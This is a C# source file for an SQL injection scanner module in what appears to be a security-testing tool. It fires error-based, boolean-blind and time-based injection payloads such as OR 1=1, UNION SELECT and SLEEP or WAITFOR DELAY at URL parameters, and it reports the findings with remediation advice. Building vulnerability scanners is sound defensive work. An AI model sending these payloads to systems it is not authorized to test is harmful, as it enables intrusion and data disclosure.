using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using Raqeeb.Domain.Entities;
using Raqeeb.Domain.Interfaces;
using Raqeeb.Domain.Scanning;

namespace Raqeeb.Infrastructure.Scanning.Modules
{
    public class SqlInjectionScanner : IScannerModule
    {
        public string Name => "SqlInjectionScanner";
        public string Description => "Detects SQL Injection vulnerabilities including error-based, blind, and time-based SQL injection.";

        // Error-based SQL injection payloads
        private static readonly List<string> ErrorBasedPayloads = new()
        {
            "'",
            "\"",
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 'x'='x",
            "\" OR \"x\"=\"x",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' UNION SELECT NULL--",
            "' AND 1=2 UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' AND 1=CONVERT(int, (SELECT @@version))--"
        };

        // Boolean-based blind SQL injection payloads
        private static readonly List<string> BlindPayloads = new()
        {
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5",
            "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>1--"
        };

        // Time-based SQL injection payloads
        private static readonly Dictionary<string, string> TimeBasedPayloads = new()
        {
            { "MySQL", "' OR SLEEP(5)--" },
            { "PostgreSQL", "'; SELECT pg_sleep(5)--" },
            { "MSSQL", "'; WAITFOR DELAY '0:0:5'--" },
            { "Oracle", "' AND DBMS_LOCK.SLEEP(5)--" }
        };

        // SQL error message patterns by database type
        private static readonly Dictionary<string, List<string>> ErrorPatterns = new()
        {
            { "MySQL", new List<string> { "mysql", "sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_query" } },
            { "PostgreSQL", new List<string> { "postgresql", "pg_query", "pg_exec", "psql", "unterminated quoted string" } },
            { "MSSQL", new List<string> { "microsoft sql", "odbc sql server", "sql server", "unclosed quotation", "incorrect syntax" } },
            { "Oracle", new List<string> { "ora-", "oracle", "pl/sql", "oci_execute" } },
            { "SQLite", new List<string> { "sqlite", "sqlite3", "sql logic error" } }
        };

        public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
        {
            var vulnerabilities = new List<Vulnerability>();

            try
            {
                // Error-based SQL injection detection
                var errorBasedVulns = await DetectErrorBasedSqli(context);
                vulnerabilities.AddRange(errorBasedVulns);

                // Blind SQL injection detection
                var blindVulns = await DetectBlindSqli(context);
                vulnerabilities.AddRange(blindVulns);

                // Time-based SQL injection detection
                var timeBasedVulns = await DetectTimeBasedSqli(context);
                vulnerabilities.AddRange(timeBasedVulns);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"SQL Injection Scanner error: {ex.Message}");
            }

            return vulnerabilities;
        }

        private async Task<List<Vulnerability>> DetectErrorBasedSqli(ScanContext context)
        {
            var vulnerabilities = new List<Vulnerability>();
            var testUrls = GenerateTestUrls(context.Target.Url);

            foreach (var testUrl in testUrls.Take(5))
            {
                foreach (var payload in ErrorBasedPayloads.Take(8))
                {
                    try
                    {
                        var response = await context.HttpClient.GetAsync(testUrl + HttpUtility.UrlEncode(payload));
                        var content = await response.Content.ReadAsStringAsync();

                        // Check for SQL error messages
                        var (hasError, dbType) = ContainsSqlError(content);
                        if (hasError)
                        {
                            vulnerabilities.Add(new Vulnerability
                            {
                                Name = "SQL Injection (Error-Based)",
                                Description = $"SQL Injection vulnerability detected via error-based technique. Database type appears to be {dbType}.",
                                Severity = Severity.Critical,
                                Evidence = $"Payload: {payload}\nDatabase: {dbType}\nURL: {testUrl}",
                                Remediation = "Use parameterized queries or prepared statements. Implement input validation. Use ORM frameworks with built-in protection.",
                                Url = testUrl
                            });
                            break; // Found vulnerability, move to next URL
                        }
                    }
                    catch
                    {
                        // Continue with next payload
                    }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<Vulnerability>> DetectBlindSqli(ScanContext context)
        {
            var vulnerabilities = new List<Vulnerability>();
            var testUrls = GenerateTestUrls(context.Target.Url);

            foreach (var testUrl in testUrls.Take(3))
            {
                try
                {
                    // Get baseline response
                    var baselineResponse = await context.HttpClient.GetAsync(testUrl + "1");
                    var baselineContent = await baselineResponse.Content.ReadAsStringAsync();
                    var baselineLength = baselineContent.Length;

                    // Test with true condition
                    var trueResponse = await context.HttpClient.GetAsync(testUrl + HttpUtility.UrlEncode("' AND '1'='1"));
                    var trueContent = await trueResponse.Content.ReadAsStringAsync();

                    // Test with false condition
                    var falseResponse = await context.HttpClient.GetAsync(testUrl + HttpUtility.UrlEncode("' AND '1'='2"));
                    var falseContent = await falseResponse.Content.ReadAsStringAsync();

                    // Compare responses
                    if (Math.Abs(trueContent.Length - baselineLength) < 100 &&
                        Math.Abs(falseContent.Length - trueContent.Length) > 100)
                    {
                        vulnerabilities.Add(new Vulnerability
                        {
                            Name = "SQL Injection (Blind/Boolean-Based)",
                            Description = "Blind SQL Injection vulnerability detected. Application behavior differs based on SQL condition truthfulness.",
                            Severity = Severity.High,
                            Evidence = $"True condition response length: {trueContent.Length}\nFalse condition response length: {falseContent.Length}\nURL: {testUrl}",
                            Remediation = "Use parameterized queries or prepared statements. Implement input validation. Avoid revealing information through response differences.",
                            Url = testUrl
                        });
                    }
                }
                catch
                {
                    // Continue with next URL
                }
            }

            return vulnerabilities;
        }

        private async Task<List<Vulnerability>> DetectTimeBasedSqli(ScanContext context)
        {
            var vulnerabilities = new List<Vulnerability>();
            var testUrls = GenerateTestUrls(context.Target.Url);

            foreach (var testUrl in testUrls.Take(2))
            {
                // Test each database type's time-based payload
                foreach (var dbPayload in TimeBasedPayloads.Take(2)) // Limit to avoid long scan times
                {
                    try
                    {
                        var stopwatch = Stopwatch.StartNew();
                        var response = await context.HttpClient.GetAsync(testUrl + HttpUtility.UrlEncode(dbPayload.Value));
                        stopwatch.Stop();

                        // If response took significantly longer (4+ seconds for a 5-second sleep)
                        if (stopwatch.ElapsedMilliseconds > 4000)
                        {
                            vulnerabilities.Add(new Vulnerability
                            {
                                Name = "SQL Injection (Time-Based)",
                                Description = $"Time-based SQL Injection vulnerability detected. Database type appears to be {dbPayload.Key}.",
                                Severity = Severity.Critical,
                                Evidence = $"Payload: {dbPayload.Value}\nResponse time: {stopwatch.ElapsedMilliseconds}ms\nExpected delay: 5000ms\nURL: {testUrl}",
                                Remediation = "Use parameterized queries or prepared statements. Implement input validation. Add rate limiting to prevent enumeration.",
                                Url = testUrl
                            });
                            break; // Found vulnerability
                        }
                    }
                    catch
                    {
                        // Continue with next payload
                    }
                }
            }

            return vulnerabilities;
        }

        private (bool hasError, string dbType) ContainsSqlError(string content)
        {
            var lowerContent = content.ToLower();

            foreach (var db in ErrorPatterns)
            {
                foreach (var pattern in db.Value)
                {
                    if (lowerContent.Contains(pattern))
                    {
                        return (true, db.Key);
                    }
                }
            }

            return (false, "Unknown");
        }

        private List<string> GenerateTestUrls(string baseUrl)
        {
            var urls = new List<string>();

            if (!baseUrl.Contains("?"))
            {
                urls.Add($"{baseUrl}?id=");
                urls.Add($"{baseUrl}?user=");
                urls.Add($"{baseUrl}?product=");
                urls.Add($"{baseUrl}?page=");
            }
            else
            {
                urls.Add($"{baseUrl}&param=");
            }

            return urls;
        }
    }
}
